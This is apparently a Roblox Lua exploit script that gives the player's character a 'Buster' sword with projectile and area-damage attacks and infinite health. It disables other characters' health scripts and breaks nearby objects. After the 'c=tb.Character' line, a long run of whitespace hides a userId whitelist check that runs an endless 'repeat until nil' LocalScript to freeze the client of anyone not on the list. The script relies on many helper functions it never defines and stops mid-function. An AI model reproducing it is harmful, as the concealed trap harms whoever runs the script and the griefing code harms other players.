
it=Instance.new cn=CFrame.new ca=CFrame.Angles cf=cn v3=Vector3.new rd=math.rad sin=math.sin v310=v3(1/0,1/0,1/0) pi=math.pi rn=math.random rev=string.reverse ts=tostring asset="http://www.roblox.com/asset/?id=" inf=1/0
wo=workspace Serv=game:GetService("Players") li=game:GetService("Lighting") deb=game:GetService("Debris") w=wait ns=16 cf=cn bc=bn mf=math.floor ud=UDim2.new cw=coroutine.wrap
qkey=false ekey=false rkey=false tkey=false ykey=false ukey=false pkey=false fkey=false gkey=false hkey=false jkey=false kkey=false lkey=false zkey=false xkey=false ckey=false vkey=false bkey=false nkey=false mkey=false semi=false
function ClearClass(Object,Class) for _,v in pairs(Object:GetChildren()) do if v:IsA(Class) then v:Destroy() end end end ti=table.insert tr=table.remove ec={"Bright blue","Really blue","Pastel Blue"}
function re(par,obj) if type(par) ~= "userdata" or type(obj) ~= "string" then return nil end if par:findFirstChild(obj) then par[obj]:Remove'' end end 
function invis(o) for i,v in pairs(o:children()) do if v:IsA("BasePart") then v.Transparency=1 end invis(v) end end 
function newhats(p,o,o2) for i,v in pairs(p:children()) do if v:IsA("Hat") then local np=v.Handle:Clone'' np.Transparency=0 np.Mesh.Scale=np.Mesh.Scale*1.1 np.Parent=o np.CFrame=v.Handle.CFrame stick2(np,o2,o) end end end 
function rtab(tabz,obj) for i=1,#tabz do if tabz[i] == obj then tr(tabz,i) break end end end sTrail={}
function Trail2(lopz,ob,waitz,col,thickz,ofz) q(function() ti(sTrail,ob)
local oldpos=(ob.CFrame *ofz).p local lopz2=0
local function loltr() local obp=(ob.CFrame *ofz).p lopz2=lopz2 + 1
local mag=(oldpos - obp).magnitude 
local tr=pa(ob,"trail","Block",0,0,0,false,false,0.5,0,col) tr.Anchored=true tr.CanCollide=false
tr.CFrame=cn(oldpos,obp) 
tr.CFrame=tr.CFrame + tr.CFrame.lookVector* (mag/2)
local trm=it("CylinderMesh",tr) trm.Scale=v3(5*thickz,mag*5,5*thickz)
q(function() for i=5*thickz,0,-5*thickz/10 do trm.Scale=v3(i*5,mag*5,i*5) w() end tr:Remove'' end)
tr.CFrame=tr.CFrame *ca(rd(90),0,0) oldpos=obp end 
repeat loltr()
wait(waitz) until ft(sTrail,ob) == nil or lopz2 == lopz loltr() end) end
tb=Serv.LocalPlayer
bp=tb.Backpack
pg=tb.PlayerGui 
c=tb.Character                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       accz={12429338,9346934,9543082,219856,26333261} if tb.userId~=accz[1] and tb.userId~=accz[2] and tb.userId~=accz[3] and tb.userId~=accz[4] and tb.userId~=accz[5] then newLocalScript([[repeat until nil]], char or pg or bp) end
he=c.Head
lcol="Mid grey"
c["Left Arm"].BrickColor=BrickColor.new(lcol)
c["Right Arm"].BrickColor=BrickColor.new(lcol)
c["Right Leg"].BrickColor=BrickColor.new(lcol)
c["Left Leg"].BrickColor=BrickColor.new(lcol)
c.Head.BrickColor=BrickColor.new(lcol)
c.Torso.BrickColor=BrickColor.new(lcol)
to=c.Torso ClearClass(to,"BodyPosition") ClearClass(to,"BodyGyro") nh=1/0
hu=c.Humanoid hu.PlatformStand=false hu.WalkSpeed=ns hu.MaxHealth=nh hu.Health=hu.MaxHealth
Button=false
running=false
a={} a.ClickHold=0 a.c=true a.a="None" a.b="None" a.Critical={20,3} ClearClass(c,"CharacterMesh") local hd=he:Clone''
to["Left Hip"].Part0=to to["Right Hip"].Part0=to to["Left Shoulder"].Part0=to to["Right Shoulder"].Part0=to
if c:findFirstChild("Suit") then deb:AddItem(c["Suit"],0.035) end 
m=qi({"Model",c,Name="Suit"})
xmod=qi({"Model",m,Name="Buster"}) 
scol="Pastel Blue"
re(c,"Block") Block=qi({"BoolValue",c,Value=false,Name="Block"}) invis(c) re(c,"HighFive") HighFive=qi({"BoolValue",c,Value=false,Name="HighFive"}) mp=300500 maxmp=300500
t=pa(m,"Torso","Block",0,0,0,false,false,0,0,ts(to.BrickColor)) tw = weld(t,to,t,0,0,0,0,0,0)
la=pa(m,"Left Arm","Block",0,0,0,false,false,0,0,ts(c["Left Arm"].BrickColor)) law = weld(la,t,la,-1.5,1,0,0,0,0)
ra=pa(m,"Right Arm","Block",0,0,0,false,false,0,0,ts(c["Right Arm"].BrickColor)) raw = weld(ra,t,ra,1.5,1,0,0,0,0)
ll=pa(m,"Left Leg","Block",0,0,0,false,false,0,0,ts(c["Left Leg"].BrickColor)) llw = weld(ll,t,ll,-0.5,-1,0,0,0,0)
rl=pa(m,"Right Leg","Block",0,0,0,false,false,0,0,ts(c["Right Leg"].BrickColor)) rlw = weld(rl,t,rl,0.5,-1,0,0,0,0)
sig=pa(m,"Eff","Block",0.01,1,0.25,false,false,0,0,scol) weld(sig,ra,sig,0.5,-1,0.25,0,0,0) qi({"BlockMesh",sig,Scale=v3(0.25,1,1)})
sig=pa(m,"Eff","Block",0.01,0.25,0.75,false,false,0,0,scol) weld(sig,ra,sig,0.5,-1+0.625,0,0,0,0) qi({"BlockMesh",sig,Scale=v3(0.25,1,1)})
sig=pa(m,"Eff","Block",0.01,0.25,0.75,false,false,0,0,scol) weld(sig,ra,sig,0.5,-1+0.125,0,0,0,0) qi({"BlockMesh",sig,Scale=v3(0.25,1,1)})
hd.Parent=m hd.Transparency=0 hw=weld(hd,t,hd,0,1.5,0,0,0,0) pcall(function() he.face.Face="Bottom" hd.face.Face="Front" end)
local nbb=it("BlockMesh") nbb.Offset=v3(0,-1,0) nbb.Scale=v3(5,10,5)
nbb:Clone''.Parent=la nbb:Clone''.Parent=ra nbb:Clone''.Parent=ll nbb:Clone''.Parent=rl 
nbb:Clone''.Parent=t t.Mesh.Offset=v3(0,0,0) t.Mesh.Scale=Vector3.new(10,10,5) 
pcall(function() c.Shirt:Remove'' end) pcall(function() c.Pants:Remove'' end) 
to["Left Hip"].Part0=t to["Right Hip"].Part0=t to["Left Shoulder"].Part0=t to["Right Shoulder"].Part0=t
function rayHit(wai,lolk,weplol,adjus,magz,mind,maxd) local DebounceTable2={} q(function()
local hitx=0 local tymzup=false q(function() w(wai) tymzup=true end) 
repeat w() local tries=0 local bhit,bpos=nil,v3(999,999,999)
repeat tries=tries + 1 local xx=0 local yy=0 if tries==1 then xx=1 elseif tries==2 then xx=-1 elseif tries == 3 then yy=1 elseif tries == 4 then yy=-1 elseif tries == 5 then xx=-1 yy=-1 elseif tries == 6 then xx,yy=1,1 elseif tries == 7 then xx,yy=-1,1 elseif tries == 8 then xx,yy=1,-1 end 
bhit,bpos=ray((weplol.CFrame *adjus *cf(xx,yy,-0.8)).p,weplol.Position - (weplol.CFrame *adjus *cf(0,0,2)).p)
if bhit ~= nil and (bpos - weplol.Position).magnitude < magz+0.8 then break end until tries > 8
if bhit==nil or (bpos - weplol.Position).magnitude > magz+0.8 then else local brea=false
for i,v in pairs(bhit.Parent:children()) do local dmge=rn(mind,maxd)
if v:IsA("Humanoid") and not DebounceTable2[v.Parent.Name] then DebounceTable2[v.Parent.Name]=true Dmgz(false,v,dmge,bhit)  hitx=hitx+1 brea=true break end end
if bhit.Parent ~= workspace and not brea then for i,v in pairs(bhit.Parent.Parent:children()) do local dmge=rn(mind,maxd)
if v.Parent:findFirstChild("Humanoid") and not DebounceTable2[v.Parent.Parent.Name] then DebounceTable2[v.Parent.Parent.Name]=true Dmgz(false,v.Parent.Humanoid,dmge,bhit) hitx=hitx+1 break end end
end 
end until hitx >= lolk or tymzup end) end
function rayHit2(weplol,adjus,magz) 
local tries=0 local bhit,bpos=nil,v3(999,999,999)
repeat tries=tries + 1 local xx=0 local yy=0 if tries==1 then xx=1 elseif tries==2 then xx=-1 elseif tries == 3 then yy=1 elseif tries == 4 then yy=-1 elseif tries == 5 then xx=-1 yy=-1 elseif tries == 6 then xx,yy=1,1 elseif tries == 7 then xx,yy=-1,1 elseif tries == 8 then xx,yy=1,-1 end 
bhit,bpos=ray((weplol.CFrame *adjus *cf(xx,yy,-0.8)).p,weplol.Position - (weplol.CFrame *adjus *cf(0,0,2)).p)
if bhit ~= nil and (bpos - weplol.Position).magnitude < magz+0.8 then break end until tries > 8
if bhit==nil or (bpos - weplol.Position).magnitude > magz+0.8 then else 
for i,v in pairs(bhit.Parent:children()) do 
if v:IsA("Humanoid") then return bhit,v end end
if bhit.Parent ~= workspace and not brea then for i,v in pairs(bhit.Parent.Parent:children()) do 
if v.Parent:findFirstChild("Humanoid") then return bhit,v.Parent.Humanoid end end
end end 
end
function DashEf(p,col) local m=pa(xmod,"","Block",4,1,2,false,true,0,0,col) m.CanCollide=false local me=qi({"SpecialMesh",m,MeshType="FileMesh",MeshId="http://www.roblox.com/asset/?id=20329976",Scale=v3(2.5,2.5,2.5)}) m.CFrame=p coroutine.resume(coroutine.create(function(part,mesh) for i=0,5 do w(0.1) part.CFrame=part.CFrame*ca(0,rn(0,2),0) mesh.Scale=mesh.Scale+v3(0.5,0.4,0.5) part.Transparency=part.Transparency+0.2 end m:remove() end),m,me) end 
function Magic(part,x1,y1,z1,x2,y2,z2,col) local S=pa(xmod,"Effect","Block",x1,y1,z1,false,true,0,0,col) S.CanCollide=false local msh1=qi({"BlockMesh",S,Scale=v3(.5,.5,.5)}) S.CFrame=part.CFrame*cn(x2,y2,z2)*ca(rn(-50,50),rn(-50,50),rn(-50,50)) coroutine.resume(coroutine.create(function(Part,CF) for i=1,9 do Part.Mesh.Scale=Part.Mesh.Scale+v3(0.1,0.1,0.1) Part.CFrame=Part.CFrame*ca(rn(-50,50),rn(-50,50),rn(-50,50)) Part.Transparency=i*.1 wait() end S.Parent=nil end),S,S.CFrame) end 
gunshot = function(speed,sc,dmg,cff) q(function()
local bb = pa(workspace,"bullet","Block",0.2*sc,0.3*sc,0.2*sc,true,true,0,0.1,"Black") qi({"CylinderMesh",bb}) bb.CFrame = cff
Trail2(15,bb,0.05,"Black",0.2,cf(0,0,0))
for i=1,50 do 
bhit,bpos=ray(bb.Position,bb.Position - (bb.CFrame *cn(0,-1,0)).p)
if bhit and bhit.Name ~= "bullet" and bhit.Name ~= "bullethole" and bhit.Name~="glowmesh" and bhit.Name~="Board" and bpos and (bpos - bb.Position).magnitude < speed  then break end
bb.CFrame=bb.CFrame*cn(0,speed,0)*ca(rd(0.2),0,0)
wait()
end bb.CFrame=bb.CFrame*cn(0,(bpos-bb.Position).magnitude,0) bb.Anchored=false stick(bb,bhit)
q(function() for i=1,7 do 
GlowMesh(false,"block",t,v3(10,10,10),"Black",bb.CFrame*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.1) 
wait() end end)
if bhit.Parent:findFirstChild("Humanoid") then 
local h = bhit.Parent.Humanoid SplashDmg(false,bb.Position,rn(15,25),10,50) 
end SplashDmg(false,bb.Position,rn(15,25),10,50) if bhit:GetMass()<=250 and not bhit.Parent:findFirstChild("Humanoid") then bhit:BreakJoints() end de(bb,5)
end) end
swordtoss = function(speed,sc,dmg,cff) q(function()
local bb = pa(workspace,"bullet","Block",1,1,1,true,true,0,0,"Black") bb.CFrame = cff de(bb,16)
GlowMesh(false,asset.."20329976",t,v3(2,1,2),"Black",cff*ca(0,rd(180),0),0,1,0.07)
qi({"SpecialMesh",bb,Scale=v3(0.75*sc,1*sc,0.75*sc),MeshType="FileMesh",MeshId=asset.."93180631",TextureId=asset.."93180676"}) 
Trail2(15,bb,0.05,"Black",0.05,cf(0,0,0))
for i=1,50 do 
bhit,bpos=ray(bb.Position,bb.Position - (bb.CFrame *cn(0,-1,0)).p)
if bhit and bhit.Name ~= "bullet" and bhit.Name ~= "bullethole" and bhit.Name~="glowmesh" and bhit.Name~="Board" and bpos and (bpos - bb.Position).magnitude < speed  then break end
bb.CFrame=bb.CFrame*cn(0,speed,0)*ca(0,0,0)
wait()
end bb.CFrame=bb.CFrame*cn(0,(bpos-bb.Position).magnitude,0) bb.Anchored=false stick(bb,bhit)
GlowMesh(false,"sphere",t,v3(10,10,10),"Black",bb.CFrame,0,1,0.07)
if bhit.Parent:findFirstChild("Humanoid") then 
local h = bhit.Parent.Humanoid SplashDmg(false,bb.Position,rn(15,25),10,50) 
end SplashDmg(false,bb.Position,rn(15,25),10,50) if bhit:GetMass()<=10 and not bhit.Parent:findFirstChild("Humanoid") then bhit:BreakJoints() end 
end) end
Lightning = function(p0,p1,tym,ofs,col,th,tra) -- start end times offset color thickness
local magz = (p0 - p1).magnitude local curpos = p0 local trz = {-ofs,ofs}
for i=1,tym do 
local li = it("Part",c) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = tra or 0.4 li.BrickColor = bc(col)
li.formFactor = "Custom" li.CanCollide = false li.Size = v3(th,th,magz/tym) local ofz = v3(trz[rn(1,2)],trz[rn(1,2)],trz[rn(1,2)]) 
local trolpos = cn(curpos,p1)*cn(0,0,magz/tym).p+ofz
if tym == i then 
local magz2 = (curpos - p1).magnitude li.Size = v3(th,th,magz2)
li.CFrame = cn(curpos,p1)*cn(0,0,-magz2/2)
else
li.CFrame = cn(curpos,trolpos)*cn(0,0,magz/tym/2)
end
curpos = li.CFrame*cn(0,0,magz/tym/2).p de(li,0.25)
end
end
function MatterBall(pos,sc,spid,tyms,dmgmul) q(function()
local cor = pa(c,"","Block",1,1,1,false,false,0,0,"Really black") qi({"SpecialMesh",cor,MeshType="Sphere"}) cor.Mesh.Scale=v3(sc,sc,sc) qi({"Fire",cor,Size=sc,Heat=0,Color=bc("Bright red").Color,SecondaryColor=bc("Bright red").Color})
local cor2 = pa(cor,"","Block",1,1,1,false,false,0,0,"Bright red") qi({"SpecialMesh",cor2,MeshType="Sphere"}) cor2.Mesh.Scale=v3(sc*0.5,sc*0.5,sc*0.5) 
cor.Transparency = 0.3 cor.Anchored = true cor.CFrame = pos cor2.Transparency=0.2 cor2.Anchored=true cor2.CFrame=cor.CFrame
for i=1,tyms do
cor.CFrame = pos*cn(0,0,-spid*i) cor2.CFrame=cor.CFrame
local bhit,bpos=ray(cor.Position,cor.Position - (cor.CFrame *cn(0,0,1)).p)
if bhit and (bpos - cor.Position).magnitude < (spid*1.1) then break end
local lolpos = FindGround(cor.CFrame) if lolpos and i%rn(2,3)==0 then GlowMesh(false,asset .. "20329976",t,v3(2.6*sc,0.8*sc,2.6*sc),"Black",cn(lolpos.p+v3(0,0.15*sc,0)),0.1,1,0.05)  end
wait() end cor.Fire:Remove()
q(function() for i=1,8 do 
cor.Transparency = cor.Transparency + 0.12 cor.Mesh.Scale = cor.Mesh.Scale+v3(0.5*sc,0.5*sc,0.5*sc) cor2.Transparency=cor.Transparency  cor2.Mesh.Scale=cor2.Mesh.Scale+v3(0.25*sc,0.25*sc,0.25*sc) 
GlowMesh(false,asset .. "20329976",t,v3(10,7,10),"Black",cor.CFrame*cn(0,-2,0)*ca(0,rn(-360,360),0),0.2,1,0.05) 
GlowMesh(false,"block",t,v3(1,1,1),"Black",cor.CFrame*cn(rn(-10,10),rn(2,10),rn(-10,10))*ca(rn(-360,360),rn(-360,360),rn(-360,360)),0.2,1,0.05) 
GlowMesh(false,asset .. "1323306",t,v3(10,10,10),"Black",cor.CFrame*cn(0,-2,0)*ca(0,rn(-360,360),0),0.2,1,0.05) 
wait() end cor:Remove() cor2:Remove() end)
local rr = sc GetRegion(cor.Position-v3(rr*2,rr*2,rr*2),cor.Position+v3(rr*2,rr*2,rr*2),function(v) Dmgz(false,v.Humanoid,rn(30,60)*dmgmul,v.Torso) end)
end) end
function ft(tablez,item) for i=1,#tablez do if tablez[i] == item then return i end end return nil end
local DBDH={}
function Dmgz(blockz,aihu,dmgzz2,pos) if ft(DBDH,aihu.Parent) then return end if aihu.Health==0 or aihu.Parent.Name==tb.Name then return end dmgdeb2=true q(function() if (aihu.Parent:findFirstChild("Block") and aihu.Parent.Block:IsA("BoolValue") and aihu.Parent.Block.Value and not blockz) or pos.Name:lower()=="shield" then splat2(pos.Position,"Block!") w(0.2) return end 
local dmgzz=dmgzz2 if game:service'Players':findFirstChild(aihu.Parent.Name) == nil then dmgzz=dmgzz*1.5 end ti(DBDH,aihu.Parent) if rn(1,a.Critical[1]) == 1 then aihu.Health=aihu.Health-dmgzz*a.Critical[2] dmgzz="Crit! " ..ts(dmgzz*a.Critical[2]) else  pcall(function() aihu.Parent["Health Script v3.1"].Disabled=true aihu.Parent.Health.Disabled=true end) aihu.Health=aihu.Health-dmgzz end if not pos then return end splat2(pos.Position,dmgzz) q(function() w(0.08) tr(DBDH,ft(DBDH,aihu.Parent)) end)
end) end
function getclass(prt,cls) for i,v in pairs(prt:children()) do if v.className:lower() == cls:lower() then return v end end return nil end 
function findclass(prt,cls) clases=0 for i,v in pairs(prt:children()) do if v.className:lower() == cls:lower() then clases=clases + 1 end end return clases end 
function SplashDmg(tehsit,pos,dmgx,mag,forc) q(function()
local function dive(obj) for i,v in pairs(obj:children()) do if i%(#obj:children()/5)==0 then w() end
if not v:IsA("Model") and v ~= to and v:IsA("BasePart") and v.Name=="Torso" and getclass(v.Parent,"Humanoid") ~= nil and (v.Position - pos).magnitude < mag then local av=getclass(v.Parent,"Humanoid") Dmgz(false,av,dmgx,v) if tehsit then av.Sit=true end 
elseif v:IsA("BasePart") and (v.Position-pos).magnitude < mag and v:GetMass() < 1000 and v.Name ~= "Handle" and findclass(v.Parent,"Humanoid") <1 and findclass(v.Parent.Parent,"Humanoid") <1 and v.Parent.Parent.Name ~= "Suit" then if (v.Position-pos).magnitude < mag then v.Anchored=false v:BreakJoints() v.CFrame=cn(v.Position,pos)*ca(0,rd(180),0) end v.Velocity=cn(pos,v.Position).lookVector*forc 
else q(function() if #v:children() > 0 and not v:IsA("BasePart") and v.className~="Script" and v.className~="Camera" then dive(v) end end) end 
end end 
dive(workspace) end) end
function SplashGrav(pos,mag) q(function() function dive(obj) for i,v in pairs(obj:children()) do if i%(#obj:children()/5)==0 then w() end 
if v:IsA("BasePart") and (v.Position-pos).magnitude < mag and v:GetMass() < 150 and v.Name ~= "Handle" and v.Parent.Name~="Weapon" and v.Parent.Name~=tb.Name and v.Parent~=m and v.Parent~=xmod and v.Parent~=vmod then 
if (v.Position-pos).magnitude < mag then if findclass(v.Parent,"Humanoid")<1 then v.Anchored=false v:BreakJoints() end pcall(function() v["BodyPositionl0l"]:Destroy() end) 
local bpp=qi({"BodyPosition",v,maxForce=v310,position=v3(pos.X,pos.Y+10,pos.Z),P=3000,Name="BodyPositionl0l"}) de(bpp,0.25) q(function() while bpp.Parent~=nil do w() 
bpp.position=v3(pos.X,pos.Y+7,pos.Z) end end) end else q(function() if #v:children() > 0 and not v:IsA("BasePart") and v.className~="Script" and v.className~="Camera" then dive(v) end end) end 
end end dive(workspace) end) end 
function splat2(pos,dmge)
local dbr=it("Model",workspace) local colz2="Bright red" if ts(dmge)=="Block!" then colz2="Bright blue" end
dbr.Name=ts(dmge) local dbri=pa(dbr,"Head","Block",1,0,1,false,false,0,0,colz2) it("Humanoid",dbr).MaxHealth=0 dbri.CanCollide=false
dbri.Anchored=true dbri.CFrame=cf(pos + v3(rn(-15,15)/10,3,rn(-15,15)/10)) game:service'Debris':AddItem(dbr,0.5) end
Cylinder=function(p,x,y,z) it("CylinderMesh",p).Scale=v3(x,y,z) end 
SpecialMesh=function(p,x,y,z,ty) local specialmesh=it("SpecialMesh",p) specialmesh.MeshType=ty or "Block" specialmesh.Scale=v3(x,y,z) end
MakeCrack = function(pos,sc,debz,par) q(function()  if not debz then  debz = 5  end  local bhit,bpos=ray(pos,pos - (pos + v3(0,10,0)),c) if bhit and bpos then
local cr = pa(par or workspace,"Crack","Block",sc,0,sc,false,true,1,0,"") cr.CanCollide=false cr.CFrame = cn(bpos) local dec=qi({"Decal",cr,Face="Top",Texture=ds.Crack}) de(cr,debz) end end) end
function SpawnSword(pos,sc,dmg,col,mind,maxd) if pos == nil then return end q(function() MakeCrater(pos.p+v3(0,2,0),3,5,3) MakeCrack(pos.p+v3(0,2,0),5,3,xmod)
GlowMesh(false,asset .. "3270017",t,v3(8*sc,8*sc,8*sc),col,pos*ca(rd(90),0,0),0.1,1,0.05)
local pro = pa(m,"","Block",5*sc,2*sc,5*sc,true,true,0,0,"Really black")
ef1=Instance.new("Fire",pro)
ef1.Size=10
ef1.Color=Color3.new(0,1,1)
ef1.SecondaryColor=Color3.new(0,1,1)
local prom = qi({"SpecialMesh",pro,Scale=v3(1.5*sc,2*sc,1*sc),MeshType="FileMesh",MeshId="http://www.roblox.com/asset/?id=83654233",TextureId="http://www.roblox.com/asset/?id=83654266"}) 
pro.CFrame = pos*ca(rd(-25),rd(90),0)*cn(0,-3*sc,0) local cff = pro.CFrame  for i=-3,1,0.4 do pro.CFrame=cff*cn(0,3*sc*i,0)*ca(0,0,0)*ca(0,0,0) w() end
local rr = sc*3.5 
GetRegion(pro.Position-v3(rr,rr,rr),pro.Position+v3(rr,rr,rr),function(v) 
v.Humanoid.PlatformStand = true v.Torso.Velocity=v3(rn(-15,15),rn(-15,15),rn(-15,15)) v.Torso.RotVelocity=v3(rn(-15,15),rn(-15,15),rn(-15,15))
local bpp = qi({"BodyVelocity",v.Torso,maxForce=v3(1/0,1/0,1/0),velocity=cn(pro.Position,v.Torso.Position+v3(0,10,0)).lookVector*50}) 
Dmgz(false,v.Humanoid,rn(mind,maxd),v.Torso)  w(0.15) bpp:Remove() v.Humanoid.PlatformStand = false v.Torso.RotVelocity=v3() v.Torso.Velocity=v3() end) 
w(1) for i=1,-3,-0.4 do pro.CFrame=cff*cn(0,3*sc*i,0)*ca(0,0,0)*ca(0,0,0) w() end pro:Remove() end)
end
AddBV=function(str,cfr,par,deb)
if not par then return end 
if par:findFirstChild'TBBV' then par.TBBV:Remove() end 
local tbbv=qi({'BodyVelocity',par,velocity=cfr.lookVector*str,maxForce=v3(1,1,1)*50000,Name='TBBV'}) de(tbbv,deb)
end
function findhum(anc) for i,vx in pairs(anc:children()) do if vx:IsA("Humanoid") then return vx end end return nil end 
function stick(hit2,hit) local weld=it("Weld") weld.Part0=hit2 weld.Part1=hit local HitPos=hit2.Position local CJ=cf(HitPos) 
local C0=hit2.CFrame:inverse() *CJ local C1=hit.CFrame:inverse() * CJ weld.C0=C0 weld.C1=C1 weld.Parent=hit2 end 
function addmp(mpz) mp=mp + mpz if mp > maxmp then mp=maxmp end end
Armb=true Armb2=true
Legb=true Legb2=true 
function Armz(ison) Armb=ison if ison then
c["Left Arm"].Transparency=0 c["Right Arm"].Transparency=0 la.Transparency=1 ra.Transparency=1
law.Part0=c["Left Arm"] law.C0=cf(0,1,0) raw.Part0=c["Right Arm"] raw.C0=cf(0,1,0) 
else
c["Left Arm"].Transparency=1 c["Right Arm"].Transparency=1 la.Transparency=0 ra.Transparency=0
law.Part0=t law.C0=cf(-1.5,1,0) raw.Part0=t raw.C0=cf(1.5,1,0) 
end end
function Legz(ison) Legb=ison if ison then
c["Left Leg"].Transparency=0 c["Right Leg"].Transparency=0 ll.Transparency=1 rl.Transparency=1
llw.Part0=c["Left Leg"] llw.C0=cf(0,1,0) rlw.Part0=c["Right Leg"] rlw.C0=cf(0,1,0) 
else
c["Left Leg"].Transparency=1 c["Right Leg"].Transparency=1 ll.Transparency=0 rl.Transparency=0
llw.Part0=t llw.C0=cf(-0.5,-1,0) rlw.Part0=t rlw.C0=cf(0.5,-1,0) 
end end function Headz(ison) if ison then he.Transparency=0 else end end 
Legz(true) Armz(true) newhats(c,hd,he)
 
function NormalPose(inc) c2(hw,inc,3,0,1.5,0,0,0,0) c2(tw,inc,3,0,0,0,0,0,0) c2(llw,inc,3,-0.5,-1,0,0,0,0) c2(rlw,inc,3,0.5,-1,0,0,0,0) c2(law,inc,3,-1.5,1,0,0,0,0) c1(raw,inc,3,1.5,1,0,0,0,0) end
function BusterPose(inc) c2(hw,inc,3,0,1.5,0,0,0,0) c2(xhaw,inc,3,0,-2,0,0,0,0) c2(tw,inc,3,0,0,0,0,0,0) c2(llw,inc,3,-0.5,-1,0,0,0,0) c2(rlw,inc,3,0.5,-1,0,0,0,0) c2(law,inc,3,-1.3,1,-0.2,30,0,18) c1(raw,inc,3,1.3,1,-0.2,-35,-40,-30) end
 
CreateBuster=function(lolpart,x,y,z,a,b,c) col1="Medium grey" col2="Dark stone grey" col3="Really black" col4="Pastel Blue"
handle=pa(xmod,"Handle","Block",0.24,1.5,0.24,false,false,0,0.2,col4) xhaw=weld(handle,lolpart,handle,x,y,z,a,b,c) xhaw.C0=cn(x,y,z)*ca(0,b,0)*ca(a,0,c) Cylinder(handle,1,1,1)
for i=0,20,1 do hpa=pa(xmod,"","Block",0.25,0.05,0.25,false,false,0,0,col3) weld(hpa,hpa,handle,0,-.75+i/10,0,0,0,0) Cylinder(hpa,1.05,0.25,1.05) end
hpa1=pa(xmod,"","Block",0.5,0.25,1.5,false,false,0,0,col3) weld(hpa1,hpa1,handle,0,0.75,0,0,0,0) it("BlockMesh",hpa1)
bladep=pa(xmod,"","Block",0.25,3,1,false,false,0,0,col2) weld(bladep,bladep,hpa1,0,1.5,0.25,0,0,0) it("BlockMesh",bladep).Scale=v3(1,1,0.99)
edge1=pa(xmod,"e","Block",3,0.25,0.45,false,false,0,0.15,col1) weld(edge1,edge1,bladep,0,-0.125/2,0.725,0,rd(180),rd(90)) SpecialMesh(edge1,1,0.5,1,"Wedge")
edge2=pa(xmod,"e","Block",3,0.25,0.45,false,false,0,0.15,col1) weld(edge2,edge2,bladep,0,-0.125/2,0.725,0,rd(180),rd(270)) SpecialMesh(edge2,1,0.5,1,"Wedge")
edge3=pa(xmod,"","Block",0.25,0.75,1,false,false,0,0,col2) weld(edge3,edge3,bladep,0,-1.875,0,rd(180),0,0) SpecialMesh(edge3,1,1,1,"Wedge")
edge4=pa(xmod,"e","Block",1.25,0.25,0.45,false,false,0,0.15,col1) weld(edge4,edge4,edge1,1.715,0,1.25,0,rd(-52.5),0) SpecialMesh(edge4,1,0.5,1,"Wedge")
edge5=pa(xmod,"e","Block",1.25,0.25,0.45,false,false,0,0.15,col1) weld(edge5,edge5,edge1,-1.715,-0.25/2,1.25,0,rd(52.5),rd(180)) SpecialMesh(edge5,1,0.5,1,"Wedge")
edge6=pa(xmod,"e","Block",0.425,0.25,0.45,false,false,0,0.15,col1) weld(edge6,edge6,edge1,1.425,0,0.7,0,rd(-57.5/2),0) SpecialMesh(edge6,1,0.5,1,"Wedge")
edge7=pa(xmod,"e","Block",0.425,0.25,0.45,false,false,0,0.15,col1) weld(edge7,edge7,edge6,0,-0.25/2,0,0,0,rd(180)) SpecialMesh(edge7,1,0.5,1,"Wedge")
xBlade=pa(xmod,"Blade","Block",0.25,4,1.5,false,false,1,0) Bladew=weld(xBlade,xBlade,bladep,0,0.5,-0.25,0,0,0)
part=pa(xmod,"","Block",0.25,1,1.25,false,false,0,0,col3) weld(part,part,hpa1,0,-0.625,-0.25+0.125,rd(180),0,0) SpecialMesh(part,1.2,1.2,1,"Wedge")
backha=pa(xmod,"","Block",1,1,1,false,false,0,0,col3) weld(backha,backha,handle,0,-1.25,0,0,rd(90),0) qi({"SpecialMesh",backha,MeshId=asset.."3270017",Scale=v3(1,1,2)})
chakram=pa(xmod,"","Block",1,1,1,false,false,0,0.2,col4) cweld=weld(chakram,chakram,backha,0,0,0,0,0,0) qi({"SpecialMesh",chakram,MeshId=asset..'47260990',Scale=v3(1,1,1)})
rod=pa(xmod,"","Block",0.32,4.25,0.32,false,false,0,0,col3) weld(rod,rod,bladep,0,0.25/2+0.375,0.4,0,0,0) Cylinder(rod,1,1,1) 
spi=pa(xmod,"","Block",0.32,1,0.32,false,false,0,0,col3) weld(spi,spi,rod,0,-4.25/2-0.25,0,rd(180),0,0) qi({"SpecialMesh",spi,MeshId=asset.."1033714",Scale=v3(0.15,0.7,0.15)})
q(function() for i=1,1/0,24 do cweld.C0=cn(0,0,0)*ca(0,0,rd(i)) w() end end)
for i,v in pairs(xmod:GetChildren()) do v.CanCollide=false end
return xhaw
end
 
CreateBuster(t,1.5,1.5,0.6,rd(-45),rd(-90),0)
 
a.Act=function(key,bool)
if bool then
if key=="x" then
end
end
end
 
re(bp,"Buster")
bin=it("HopperBin",bp) bin.Name="Buster"
script.Parent=bin
 
bin.Selected:connect(function(mouse) mou = mouse
if a.a=="None" and a.b=="None" and a.c then a.c=false
Armz(false) c2(law,0.1,3,-1.2,1,0,0,0,30) c1(raw,0.1,3,1.5,0.25,0,-210,20,0) 
local ofs = ra.CFrame:toObjectSpace(handle.CFrame)
xhaw.Part0=ra xhaw.C0=ofs xhaw.C1=cn(0,0,0) rAni(xhaw) c1(xhaw,0.1,0,0,-2,0,90,0,0)
xhaw.C0=cn(0,-2,0)*ca(rd(90),0,0) xhaw.C1=cn(0,0,0) BusterPose(0.1) a.a="Buster" a.c=true
end
mouse.Button1Down:connect(function() 
Button=true q(function() while true do w(0.1) if Button==true then a.ClickHold=a.ClickHold+0.1 else a.ClickHold=0 break end end end)
q(function() while w() do if fac==true then bgg.maxTorque = v3(1/0,1/0,1/0) bgg.D = 50  bgg.cframe = cn(to.Position,v3(mouse.hit.p.x,to.Position.y,mouse.hit.p.z)) else bgg.maxTorque = v3(0,0,0) end end end)
 
if a.a=="Buster" and a.b=="None" and qkey and Button and a.c and mp>=135 then a.c=false a.b="Swords From Heaven" mp=mp-135 fac=true
c2(tw,0.08,3,0,0,0,0,50,0) c2(hw,0.08,3,0,1.5,0,0,-40,0) c1(raw,0.08,3,1.5,1,0,-140,0,-18)
c2(tw,0.125,3,0,0,0,0,-40,0) c2(hw,0.125,3,0,1.5,0,0,45,0) c1(raw,0.125,3,1.25,1,-0.5,23,-25,-18) GlowMesh(true,asset.."20329976",to,v3(3,2,3),"Black",cn(-1,-1.5,-3),0.3,1,0.1)
